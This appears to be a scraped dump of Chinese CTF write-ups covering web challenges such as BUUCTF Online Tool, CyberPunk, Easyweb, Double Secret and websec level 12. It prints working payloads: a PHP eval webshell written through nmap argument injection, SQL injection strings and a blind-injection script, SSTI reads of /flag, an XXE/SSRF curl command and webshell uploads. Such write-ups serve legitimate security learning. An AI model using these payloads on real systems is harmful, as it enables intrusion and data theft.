zuckonit的MD5是没怎么接触过的……就挑一道MD5的题写叭…… 结果一上来就是： pass应该是可以控制的变量……构造MD5后的变量 *md5(\\string,raw*)**： 但我折腾半天，网上写的都是什么mysql解释16进制、ASCII编码成字符串、hex之类的……看得不是很懂 反正直接就出了，所以应该讨论的是：MD5的32位密文与16位密文的转换。 md5的输出只有128bit一种32个byte，或者32个ascii可显示字符形du式的是zhi其hex码的显示形式16个byte是其直dao接输出形式。16*8=128bit这里只要把每4bit用一个char表示，就成了32个byte的可打印显示形式 这里的理解为写脚本（抄脚本）产生了一定的阻碍…… 找了几个脚本碰撞，结果碰了一上午也没碰出来…… 自己想写一个长度增长的枚举，结果代码水平太差了……一般网上的脚本也是指定长度……唉，我还是用答案叭 争取以后自己写一个顺手的截断的枚举（php会不会更好使……），这玩意用到的时候没有就挺恶心的……… 后面两个就直接用数组绕过就行了……","link":"/2021/02/10/BJDCTF2020-Easy-MD5/"},{"title":"BUUCTF-2018-Online-Tool","text":"[BUUCTF 2018]Online Tool1.题目：123456789101112131415161718&lt;?phpif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];}if(!isset($_GET['host'])) { highlight_file(__FILE__);} else { $host = $_GET['host']; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(&quot;glzjin&quot;. $_SERVER['REMOTE_ADDR']); echo 'you are in sandbox '.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);} 2.过程： 关于escapeshellarg和escapeshellcmd escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数 功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号) escapeshellcmd — shell 元字符转义 功能：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。 反斜线（\\）会在以下字符之前插入： &amp;#;`|\\?~&lt;&gt;^()[]{}$, \\x0A 和 \\xFF\\。 \\’* 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 好像因为环境问题？本地测试不是很对……参考dalao：谈谈escapeshellarg参数绕过和注入的问题 由于先使用escapeshellarg，再使用escapeshellcmd导致的命令执行漏洞 在线php测试成功了……： ‘’ \\ ‘’ A ‘\\‘ ‘’ ：这样显示，单引号都被闭合了，传入参数就可以成为命令执行 单引号前后要加空格，防止格式改变或后缀改变 结合：利用/绕过 PHP escapeshellarg/escapeshellcmd函数 可知，需要利用预置的命令，拼接执行；这里关系到namp的命令 namp命令有保存扫描结果的命令： Nmap输出格式 -oN (标准输出) -oX (XML输出) -oS (ScRipT KIdd|3 oUTpuT) -oG (Grep输出) -oA (输出至所有格式) namp中文网#输出 在保存结果的同时，可以向文件中写入语句，这里写入一句话即可 1?host=' &lt;?php @eval($_POST[&quot;ok&quot;]);?&gt; -oG 1.php ' sandbox指明文件目录，antsword链接： 获取flag","link":"/2021/03/09/BUUCTF-2018-Online-Tool(nmap)/"},{"title":"Bugku-Web_php_unserialize","text":"Web_php_unserialize1.题目：https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5409&amp;page=12.过程： var需要base64解密后绕过匹配，反序列化包含flag文件 匹配函数对（[o或c]:[一个或多个数字] /i：不区分大小写）进行匹配，可以利用+解析为空格绕过 由于private的属性，只能编写程序在内部base64编码： 得到flag。","link":"/2021/02/17/Bugku-Web-php-unserialize/"},{"title":"Bugku冬至红包","text":"冬至红包1.题目：https://ctf.bugku.com/challenges/detail/id/150.html2.过程： exam拼接了一个语句，本地执行可知exam长度恒为49 SHA-1（英语：Secure Hash Algorithm 1，中文名：安全散列算法1）是一种密码散列函数，美国国家安全局设计，并由美国国家标准技术研究所（NIST）发布为联邦数据处理标准（FIPS）。SHA-1可以生成一个被称为消息摘要的160位（20字节）散列值，散列值通常的呈现形式为40个十六进制数。 关键在于执行flag语句且使输出与sha1处理后值相同，类似MD5，sha1不能处理数组，但flag是提前定义好的…… 还是要利用eval函数，输出flag。因为长度限制很大，所以可以拼接。 ?flag=$a=alag;$a{0}=f;111111111111111111111;?&gt;&lt;?=$$a;?&gt; ?&gt;闭合上一个eval &lt;?=?&gt;标签相当于使用echo：","link":"/2021/02/16/Bugku%E5%86%AC%E8%87%B3%E7%BA%A2%E5%8C%85/"},{"title":"CISCN2019-华北赛区-Day1-Web5-CyberPunk","text":"[CISCN2019 华北赛区 Day1 Web5]CyberPunk 摸索一下，有添加订单，查找订单，删除订单，确认订单，更改订单的功能： index、confirm、delete、search、change、config index页面有提示：?file，用php://读取： index.php： 123456789101112131415&lt;?phpini_set('open_basedir', '/var/www/html/');// $file = $_GET[&quot;file&quot;];$file = (isset($_GET['file']) ? $_GET['file'] : null);if (isset($file)){ if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) { echo('no way!'); exit; } @include($file);}?&gt;&lt;!--?file=?--&gt; 其他页面都有针对sql的过滤： 123$pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; 我们可以发现，address(地址)没有过滤…… 在添加订单功能中（confirm.php）： 1$re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone); bind_param： 该函数绑定了 SQL 的参数，且告诉数据库参数的值。 “sss” 参数列处理其余参数的数据类型。s 字符告诉数据库该参数为字符串。 参数有以下四种类型: i - integer（整型）d - double（双精度浮点型）s - string（字符串）b - BLOB（布尔值） 这个函数的使用绑定了参数为字符串，有效防止了sql注入…… change.php： 1234567891011121314151617181920212223242526272829303132333435&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){ $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[&quot;user_name&quot;]; $address = addslashes($_POST[&quot;address&quot;]); $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = &quot;select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'&quot;; $fetch = $db-&gt;query($sql); } if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){ $row = $fetch-&gt;fetch_assoc(); $sql = &quot;update `user` set `address`='&quot;.$address.&quot;', `old_address`='&quot;.$row['address'].&quot;' where `user_id`=&quot;.$row['user_id']; $result = $db-&gt;query($sql); if(!$result) { echo 'error'; print_r($db-&gt;error); exit; } $msg = &quot;订单修改成功&quot;; } else { $msg = &quot;未找到订单!&quot;; }}else { $msg = &quot;信息不全&quot;;}?&gt; $address = addslashes($_POST[&quot;address&quot;]);对修改值进行了转义操作…… 由于报错信息是可以打印出来的，是一个新的知识点： 报错注入https://blkstone.github.io/2017/11/09/updatexml-sqli/ 利用updatexml的中间不合语法的参数报错带出数据 至于二次注入，很多wp都没解释……我猜测一波…… 在更新数据时，虽然对修改值进行了转义操作，但不会将\\带入数据库，拿出时仍是'。 $row = $fetch-&gt;fetch_assoc();抓取的是上一次的数据 “‘, `old_address`=’”.$row[‘address’]是上一次的address，这使得 ‘ 依然起效…… 我们先注入报错语句，再在change随便更改下，上次注入语句便开始工作，获得报错内容，带出数据。 构造语句使符合语法进行报错注入： 123456address=1' where user_id=updatexml(1,concat(0x7e,(select(database())),0x7e),1)#address=1' where user_id=updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#address=1' where user_id=updatexml(1,concat(0x7e,substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x75736572)),20,30),0x7e),1)# 查了一大波东西，似乎没有flag……? 原题目好像告诉了要读根目录的flag.txt…… address=1' where user_id=updatexml(1,concat(0x7e,substr(load_file('/flag.txt'),1,20),0x7e),1)# address=1' where user_id=updatexml(1,concat(0x7e,substr(load_file('/flag.txt'),20,60),0x7e),1)# flag{db0fd1ea-0731-4 b94-ad41-e7e6192643eb} 得到了flag……","link":"/2021/04/23/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/"},{"title":"BuuCTF-WEB部分基础题-1","text":"BuuCTF-WEB部分基础题（1） 感觉这些题单独写有点少……所以写一块。 [ACTF2020 新生赛]Include1.题目链接：https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Include2.过程：题目说明’include’为文件包含漏洞。打开后有一个tips，点开后URL出现了file=flag.php.的调用。 flag应该在flag.php中，但是以php语句解释并运行，导致flag无法正常显示…… 所以可以在中间对其进行base64编码，使其无法运行…… payload：?file=php://filter/read=convert.base64-encode/resource=flag.php base64解码后： 123&lt;?phpecho &quot;Can you find out the flag?&quot;;//flag{d962dde8-63dd-4b9d-bed6-ca2d1234e05a} em，原来是注释掉了…… [极客大挑战 2019]EasySQL1.题目链接：https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL2.过程： 我是cl4y，是一个WEB开发程序员，最近我做了一个网站，快来看看它有多精湛叭！ SQL也是刚学，找个简单的练练手…… 打开之后是一个用户登录界面。 随便一输，回显“NO,Wrong username password！！！” 试试我新学的万能密码 1' or 1=1# '闭合掉上一个语句，or 1=1 恒true，#注释掉后面的语句 结果直接把flag打出来了…… flag{44c19f5a-76e2-4d2a-b95f-50755985dc5a} ……","link":"/2020/12/06/BuuCTF-WEB%E9%83%A8%E5%88%86%E5%9F%BA%E7%A1%80%E9%A2%98-1/"},{"title":"buu五道题：Exec、Knife、easy_tornado、fake google、你传你🐎呢","text":"[ACTF2020 新生赛]Exec1.题目：2.过程： 这个好像当时没有写wp，补一下 今年的ACTF有个题倒是和这个差不多，感觉这个简单一些吧……远程的命令执行 发现根目录有flag，cat： [极客大挑战 2019]Knife1.题目：2.过程： 网站给自己下了个马……直接用蚁剑连： [护网杯 2018]easy_tornado1.题目：2.过程： flag in /fllllllllllllag Tornado是一种 Web 服务器软件的开源版本。 Tornado 和主流Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。 提示： 应该就是后面的验证……改掉之后是error界面 ?msg=1 则页面显示是1，页面有严格的过滤…… 在Tornado模板中： 二、两种表现形式 （一）模板变量 12345{{ variable_name }}&lt;body&gt;欢迎{{ username }}登录&lt;/body&gt; 它也可以是python表达式 12{{ 1 + 1 }}{{ time.time() }} （二）模板命令 其实就是，大括号百分号所包裹的python语法 12345{%%}{% if 1 %} this is if{% end %} 搜索cookie_secret，发现结果与tornado有关，官网的搜索结果： 这是RequestHandler中包含application的意思吗…… python SSTI tornado render模板注入中的解释： handler 指向RequestHandler 而RequestHandler.settings又指向self.application.settings 所以handler.settings就指向RequestHandler.application.settings了 通过handler.settings获得环境变量？ 使用案例： （self类似于this） 细节上还不是很懂……大概是可以指向RequestHandler，获取内部的变量吧。 获取到cookie_secret，加密： 访问获取flag： [MRCTF2020]你传你🐎呢1.题目：2.过程：直接上来让上传木马……过滤了后缀名 之前的一道题是.user.ini的利用，要求在上传到.user.ini的文件夹下，也要有可执行的正常php文件。 这个并没有……应该是提到的.htaccess文件 .htaccess详解及.htaccess参数说明 .htaccess是什么文件？有什么用途？ 这里可以用AddType application/x-httpd-php .jpg，指定将jpg文件解析为php文件。 上传之后用antsword连接…… ![image-20210228184753486](/images/Buu五道题：Exec、Knife、easy_tornado、fake google、你传你🐎呢/image-20210228184753486.png) 在根目录找到flag。 [BJDCTF 2nd]fake google1.题目：2.过程：搜索一下： ![image-20210226233025995](/images/Buu四道题：Exec、Knife、easy_tornado、fake google/image-20210226233025995.png) 此时页面的源码为： ![image-20210226233149495](/images/Buu四道题：Exec、Knife、easy_tornado、fake google/image-20210226233149495.png) ssti……用一下forgetful的解就过了，记一下吧……： 1{{lipsum.__globals__['os'].popen('cat /flag').read()}} （这篇好水……）","link":"/2021/02/24/Buu%E4%BA%94%E9%81%93%E9%A2%98%EF%BC%9AExec%E3%80%81Knife%E3%80%81easy_tornado%E3%80%81fake%20google%E3%80%81%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2/"},{"title":"CISCN2019-华东南赛区-Double-Secret","text":"[CISCN2019 华东南赛区]Double SecretWelcome To Find Secret 记录一下…… 寻找secret……扫不出后台，robots页面似乎没什么用…… 尝试发现secret页面： 提交参数secret： 随便输入报错： rc4似乎是需要密钥的一种加密，猜测此处暴漏了密钥 并且解密后进行模板渲染，flask，模板注入…… 记录下脚本与用法……本地报错，搞了好长时间，输出又不对 拉到kali中，安装python3可以运行……很迷…… 12345678910111213141516171819202122232425262728293031323334import base64from urllib.parse import quotedef rc4_main(key = &quot;init_key&quot;, message = &quot;init_message&quot;): # print(&quot;RC4加密主函数&quot;) s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return cryptdef rc4_init_sbox(key): s_box = list(range(256)) # 我这里没管秘钥小于256的情况，小于256不断重复填充即可 # print(&quot;原来的 s 盒：%s&quot; % s_box) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] # print(&quot;混乱后的 s 盒：%s&quot;% s_box) return s_boxdef rc4_excrypt(plain, box): # print(&quot;调用加密程序成功。&quot;) res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) # print(&quot;res用于加密字符串，加密后是：%res&quot; %res) cipher = &quot;&quot;.join(res) print(&quot;加密后的字符串是：%s&quot; %quote(cipher)) #print(&quot;加密后的输出(经过编码):&quot;) #print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8')) return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))rc4_main(&quot;HereIsTreasure&quot;,&quot;{{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag.txt').read()}}&quot;)","link":"/2021/05/14/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/"},{"title":"CISCN2019-总决赛-Day2-Web1-Easyweb","text":"[CISCN2019 总决赛 Day2 Web1]Easyweb进入题目是一个登录界面： 其中每次登录猫猫的图片会发生变化 查看robots.txt有所发现： User-agent: * Disallow: *.php.bak 说明存在以.php.bak结尾的源码备份……但尝试一下发现不是index，也不是users……难道要爆破…… 查看源码发现： &lt;div class=&quot;avtar&quot;&gt;&lt;img src=&quot;image.php?id=2&quot; width=&quot;200&quot; height=&quot;200&quot;/&gt;&lt;/div&gt; 存在image.php…… 123456789101112131415161718&lt;?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id='{$id}' or path='{$path}'&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path); PHP addslashes() 函数 addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 预定义字符是： 单引号（’） 双引号（”） 反斜杠（\\） NULL '会被转义掉，但配合str_replace就可以产生一些奇妙的变化 ?id=\\0： 这样就可以传入一个转义符号，类似Hgame2021的jali，转义掉一个'，注释掉一个'来注入 ?id=\\\\0&amp;path=or 1=1%23即为： select * from images where id='\\' or path='or 1=1#'=&gt; =&gt; select * from images where id=’\\‘ or path=’or 1=1#’ =&gt; select * from images where id=’xxx’or 1=1#’ 脚本： 1234567891011121314151617181920212223242526272829303132333435363738# coding=utf-8import requestsimport timeflag = &quot;&quot;url1 = &quot;http://3c46950f-801d-4706-8c49-8e6974909d4c.node3.buuoj.cn/image.php?id=\\\\0&amp;path=or if(ord(substr(database(),{},1))&gt;={},1,0)%23&quot;# 库名url2 = &quot;http://3c46950f-801d-4706-8c49-8e6974909d4c.node3.buuoj.cn/image.php?id=\\\\0&amp;path=or &quot; \\ &quot;if(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{},1))&gt;={},1,0)%23&quot;# 表名url3 = &quot;http://3c46950f-801d-4706-8c49-8e6974909d4c.node3.buuoj.cn/image.php?id=\\\\0&amp;path=or &quot; \\ &quot;if(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x7573657273)),{},1))&gt;={},1,0)%23&quot;# 列名，因为不能用单引号，使用16进制代替。url4 = &quot;http://3c46950f-801d-4706-8c49-8e6974909d4c.node3.buuoj.cn/image.php?id=\\\\0&amp;path=or &quot; \\ &quot;if(ord(substr((select(password)from(users)),{},1))&gt;={},1,0)%23&quot;# 数据url = url4# 选择查询语句for x in range(1, 100): l = 32 r = 126 while r &gt; l: mid = int((l + r + 1) / 2) x = str(x) y = str(mid) pay = url.format(x, y) response = requests.get(url=pay) if &quot;JFIF&quot; in response.text: l = mid else: r = mid - 1 # time.sleep(0.03) flag += (chr(int(r))) print(chr(int(r))) print(flag)print(flag) 查询结果： 库：ciscnfinal 表：images：id,path ​ users： username：admin​ password ：e957ea7cd1b7147600b8 找到了admin的账号与密码，登录： user.php是一个上传点…… 上传后会生成提交记录，记录了上传文件名 e.g：/logs/upload.6274dd38c24268134ba3baabf7c82f0d.log.php 上传过滤了php……可以使用短标签：&lt;?=eval($_GET['a'])?&gt; 测试一下： ?a=echo 1; 成功执行了语句，蚁剑连接，在根目录即可找到flag","link":"/2021/04/23/CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1-Easyweb/"},{"title":"DASCTF三月复现","text":"ez_serialize1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phperror_reporting(0);highlight_file(__FILE__);class A{ public $class; public $para; public $check; public function __construct() { $this-&gt;class = &quot;B&quot;; $this-&gt;para = &quot;ctfer&quot;; echo new $this-&gt;class ($this-&gt;para); } public function __wakeup() { $this-&gt;check = new C; if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) { echo new $this-&gt;class ($this-&gt;para); } else die('bad hacker~'); }}class B{ var $a; public function __construct($a) { $this-&gt;a = $a; echo (&quot;hello &quot;.$this-&gt;a); }}class C{ function vaild($code){ $pattern = ''; if (preg_match($pattern, $code)){ return false; } else return true; }}if(isset($_GET['pop'])){ unserialize($_GET['pop']);}else{ $a=new A;} 逻辑还是挺好捋的……这里关键是对php原生文件操作类的应用： https://www.php.net/manual/zh/book.spl.php 类 描述 DirectoryIterator 遍历目录。 FilesystemIterator 遍历目录。 GlobIterator 遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag*。 SplFileObject 读取文件，按行读取，多行需要遍历；URL 可作为文件名，受到allow_url_fopen影响。 finfo/finfo_open() 需要两个参数，读取文件。 123456789public function __wakeup() { $this-&gt;check = new C; if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) { echo new $this-&gt;class ($this-&gt;para); } else die('bad hacker~'); } 这里就可以控制class为SPL(标准PHP类库)中的文件操作类。 但是……DirectoryIterator和FilesystemIterator 作为迭代器，需要循环遍历输出每一个不同的目录下文件，所以直接输出只显示第一个文件 GlobIterator可以使用通配符搜索，同样，只显示搜素到的第一个文件…… 这道题就是利用FilesystemIterator找flag文件，SplFileObject读取flag文件 来看类似的一道题： websec-LevelTwelvehttp://websec.fr/level12/index.php finfo的利用： SyntaxFINFO (file-id,info-item) file-id specifies the identifier that was assigned when the file was opened (generally by the FOPEN function). info-item specifies the number of the information item that is to be retrieved. FINFO函数为先前已打开并由FOPEN函数分配了文件ID的外部文件返回指定信息项的值。 FINFO，FOPTNAME和FOPTNUM函数支持以下信息项。 file-id： Information Items for Unix System Services Files Unix系统服务文件的信息项 Item 项目标识符 Definition 1 File Name文件名 File name 2 Access Permission存取权限 Read, write, and execute permissions for owner, group, and other 3 Number of Links链接数 Number of links in the file 4 Owner Name所有者名称 User ID of the owner 5 Group Name团队名 Name of the owner’s access group 6 File Size文件大小 File size 7 Last Modified最后修改 Date file last modified Information Items for Sequential Files and members of PDSs and PDSEs 顺序文件以及PDS和PDSE成员的信息项 Item Item Identifier Definition 1 Dsname名称 File name 2 Unit单元 Disk type 3 Volume体积 Volume on which data setresides 4 Disp显示 Disposition 5 Blksize Block size 6 Lrecl Record length 7 Recfm Record format info-item：所打开的文件 好不容易查到的资料，似乎也没什么用…… 控制类名读取index.php 这里大量的报错，带出了许多文件内容， 具体原因：https://www.anquanke.com/post/id/167140#h2-7 12345678910111213141516171819202122232425&lt;?php/*Congratulation, you can read this file, but this is not the end of our journey.- Thanks to cutz for the QA.- Thanks to blotus for finding a (now fixed) weakness in the &quot;encryption&quot; function.- Thanks to nurfed for nagging us about a cheat*/$text = 'Niw0OgIsEykABg8qESRRCg4XNkEHNg0XCls4BwZaAVBbLU4EC2VFBTooPi0qLFUELQ==';$key = ini_get ('user_agent');if ($_SERVER['REMOTE_ADDR'] === '127.0.0.1') { if ($_SERVER['HTTP_USER_AGENT'] !== $key) { die (&quot;Cheating is bad, m'kay?&quot;); } $i = 0; $flag = ''; foreach (str_split (base64_decode ($text)) as $letter) { $flag .= chr (ord ($key[$i++]) ^ ord ($letter)); } die ($flag);}?&gt; 接下来就是获取key了 借助SplFileObject的特性，访问我们的IP，监听获取use_agent，也就是key 加一个\\就可以绕过……： Without any namespace definition, all class and function definitions are placed into the global space - as it was in PHP before namespaces were supported. Prefixing a name with \\ will specify that the name is required from the global space even in the context of the namespace. 百度机翻： 没有任何名称空间定义，所有的类和函数定义都放在全局空间中——就像在支持名称空间之前的PHP中一样。在名称前面加上\\将指定该名称必须来自全局空间，即使在命名空间的上下文中也是如此。 获得key：aiviGohdahvueL0dedi5hievi0Ahsh1aor9aiQu5eemaisi7Phai9PhohpheiweiP7eifooVooviesh9meighoolahm3Phe0Ii6gieL1Pidoodiephein3iK8tae3aec 解密脚本： 12345678910&lt;?php$key = &quot;aiviGohdahvueL0dedi5hievi0Ahsh1aor9aiQu5eemaisi7Phai9PhohpheiweiP7eifooVooviesh9meighoolahm3Phe0Ii6gieL1Pidoodiephein3iK8tae3aec&quot;;$text = &quot;Niw0OgIsEykABg8qESRRCg4XNkEHNg0XCls4BwZaAVBbLU4EC2VFBTooPi0qLFUELQ==&quot;;$flag = &quot;&quot;;foreach (str_split (base64_decode ($text)) as $letter) { $flag .= chr (ord ($key[$i++]) ^ ord ($letter));}echo $flag;//WEBSEC{Many_thanks_to_hackyou2014_web400_MSLC_&lt;3} 大佬的ssrf（这是利用了xml吗……tql）： 12345得到源码:curl -s --data 'submit=&amp;class=SimpleXMLElement&amp;param2=2&amp;param1=&lt;!DOCTYPE xxe [&lt;!ENTITY foo SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/index.php&quot;&gt;]&gt;&lt;root&gt;%26foo;&lt;/root&gt;' http://websec.fr/level12/index.php | grep -oE -m1 '&lt;pre&gt;(.*)&lt;/pre&gt;' 可以继续获取php.ini，路径未知， 也可以: 通过ssrf获取flag: curl -s --data 'submit=&amp;class=SimpleXMLElement&amp;param2=2&amp;param1=&lt;!DOCTYPE xxe [&lt;!ENTITY foo SYSTEM &quot;http://127.0.0.1/level12/index.php&quot;&gt;]&gt;&lt;root&gt;%26foo;&lt;/root&gt;' http://websec.fr/level12/index.php | grep -oE -m1 'WEBSEC{.*}'","link":"/2021/03/30/DASCTF%E4%B8%89%E6%9C%88%E5%A4%8D%E7%8E%B0serialize/"},{"title":"De1CTF-2019-SSRF-Me","text":"[De1CTF 2019]SSRF Me1.题目：2.过程：进入题目，大概是一坨python的代码……拖到编译器里手动格式化一下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#! /usr/bin/env python# encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding('latin1')app = Flask(__name__)secert_key = os.urandom(16)class Task:def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if (not os.path.exists(self.sandbox)): # SandBox For Remote_Addr os.mkdir(self.sandbox)def Exec(self): result = {}result['code'] = 500if (self.checkSign()): if&quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, 'w') resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result['data'] = resp else: print resptmpfile.write(resp)tmpfile.close()result['code'] = 200if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read()if result['code'] == 500: result['data'] = &quot;Action Error&quot; else: result['code'] = 500result['msg'] = &quot;Sign Error&quot;return resultdef checkSign(self):if(getSign(self.action, self.param) == self.sign): return True else: return False # generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=['GET', 'POST']) def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot;@app.route('/De1ta', methods=['GET', 'POST'])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if (waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec()) \\@app.route('/')def index(): return open(&quot;code.txt&quot;, &quot;r&quot;).read()def scan(param): socket.setdefaulttimeout(1) try: return urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot;def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check = param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return Falseif __name__ == '__main__': app.debug = Falseapp.run(host='0.0.0.0', port=80) 还是挺乱的……能看懂就行…… 先看路由： 1234@app.route(&quot;/geneSign&quot;, methods=['GET', 'POST']) def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) ※action = &quot;scan&quot; 调用了getSign： 12def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() 也就是说，访问/geneSign，会根据secert_key、param、action生成MD5的签名 action的默认值为scan 123456789@app.route('/De1ta', methods=['GET', 'POST'])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr ※if (waf(param)): return &quot;No Hacker!!!!&quot; ※task = Task(action, param, sign, ip) return json.dumps(task.Exec()) \\ walf： 123456def waf(param): check = param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False class task和Exec： 12345678910111213141516171819202122232425262728293031323334class Task:def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if (not os.path.exists(self.sandbox)): # SandBox For Remote_Addr os.mkdir(self.sandbox)def Exec(self): result = {} result['code'] = 500※if (self.checkSign()): if&quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, 'w') resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result['data'] = resp else: print resptmpfile.write(resp)tmpfile.close()result['code'] = 200if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, 'r') result['code'] = 200 result['data'] = f.read()if result['code'] == 500: result['data'] = &quot;Action Error&quot; else: result['code'] = 500result['msg'] = &quot;Sign Error&quot;return result 在核对签名后，如果scan在action中，则scan读取param并存放到result.txt中 如果read在action中，则read读取并显示result.txt……大概是这个意思 想read就要伪造签名，这里存在一种攻击方式： 哈希长度扩展攻击想要了解这种攻击方式，就要了解哈希： 1.HASH:Hash，一般翻译做散列、杂凑，或音译为哈希，是把任意长度的输入（又叫做预映射pre-image）通过散列算法变换成固定长度的输出，该输出就是散列值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。基于Merkle–Damgård结构。 2.例如：MD5一般md5在签名时会是这样的： md5（key+data） 我们不知道key，但是data是可以控制的 如果同时我们知道了key的长度就可以无需key，计算出md5（key+data+attach） attach就是我们任意附加的字段。 md5在加密时，data按照512位分块处理，最后一块不满512位的处理： data+padding+length(data)：总长度为64字节； length(data)：8字节，64位长，描述data原始信息的长度，按照小端储存； padding：填充，根据“\\80”+(“\\x00”)*x,使得达到448位长度。 这样，数据就可以分块计算了。 MD5规定了有初始计算向量，向量依次与每个数据块计算，每计算一次，得到新的向量。 新的向量会覆盖掉初始向量，成为下个数据块的计算向量。最后的计算向量处理后就是最终的md5值。 